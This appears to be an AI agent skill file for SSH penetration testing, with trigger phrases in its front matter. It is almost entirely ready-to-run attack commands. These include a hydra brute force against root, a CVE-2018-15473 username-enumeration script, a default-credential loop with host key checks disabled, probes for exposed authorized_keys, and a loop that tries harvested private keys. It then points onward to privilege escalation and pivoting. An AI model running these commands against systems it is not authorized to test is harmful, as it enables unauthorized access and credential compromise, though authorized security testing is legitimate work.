---
name: proto-ssh
description: "SSH security testing — version detection, brute force, key-based auth bypass, SSH tunneling, authorized_keys misconfiguration, weak ciphers. Triggers: 'ssh', 'ssh pentest', 'ssh attack', 'ssh brute force', 'ssh key', 'ssh misconfiguration', 'ssh tunneling', 'openssh vulnerability'."
---

# SSH Security Testing

Assess SSH configuration, credential security, and key management.

---

## Phase 1: Enumeration

```bash
TARGET="TARGET_IP"
PORT="22"

# Version and cipher enumeration:
nmap -p $PORT -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey "$TARGET" 2>/dev/null | tee output/ssh_enum.txt

# Check for weak algorithms:
ssh-audit "$TARGET" 2>/dev/null | tee output/ssh_audit.txt

# Manual banner grab:
nc "$TARGET" $PORT < /dev/null 2>/dev/null | head -1
```

---

## Phase 2: Credential Testing

```bash
TARGET="TARGET_IP"

# Brute force (hydra):
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$TARGET \
  -t 4 -vV 2>&1 | tee output/ssh_brute.txt

# Username enumeration (CVE-2018-15473):
python3 /opt/ssh_enum.py --username admin --port 22 "$TARGET"

# Common credentials:
for CRED in "root:root" "root:toor" "admin:admin" "ubuntu:ubuntu" "pi:raspberry"; do
  USER=$(echo $CRED | cut -d: -f1)
  PASS=$(echo $CRED | cut -d: -f2)
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$USER@$TARGET" "id" 2>/dev/null && \
    echo "VALID: $USER:$PASS"
done | tee output/ssh_default_creds.txt
```

---

## Phase 3: Key Issues

```bash
TARGET="TARGET_IP"
USER="ubuntu"

# Check for authorized_keys exposure:
curl -s "http://$TARGET/.ssh/authorized_keys" 2>/dev/null
curl -s "http://$TARGET/authorized_keys" 2>/dev/null

# Test known private keys (found in recon):
for KEY in /tmp/*.pem /tmp/id_rsa /tmp/*.key; do
  chmod 600 "$KEY" 2>/dev/null
  ssh -i "$KEY" -o StrictHostKeyChecking=no -o ConnectTimeout=3 "$USER@$TARGET" "id" 2>/dev/null && \
    echo "KEY WORKS: $KEY"
done

# Check for password auth enabled:
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  "$USER@$TARGET" 2>&1 | grep -i "Permission denied\|password"
```

---

## Output

Save to `output/`:
- `ssh_enum.txt` — version and algorithm enumeration
- `ssh_audit.txt` — weak cipher findings
- `ssh_brute.txt` — credential brute force results

## Next Phase

→ `post-linux-privesc` after SSH access
→ `post-pivoting` for SSH tunnel setup
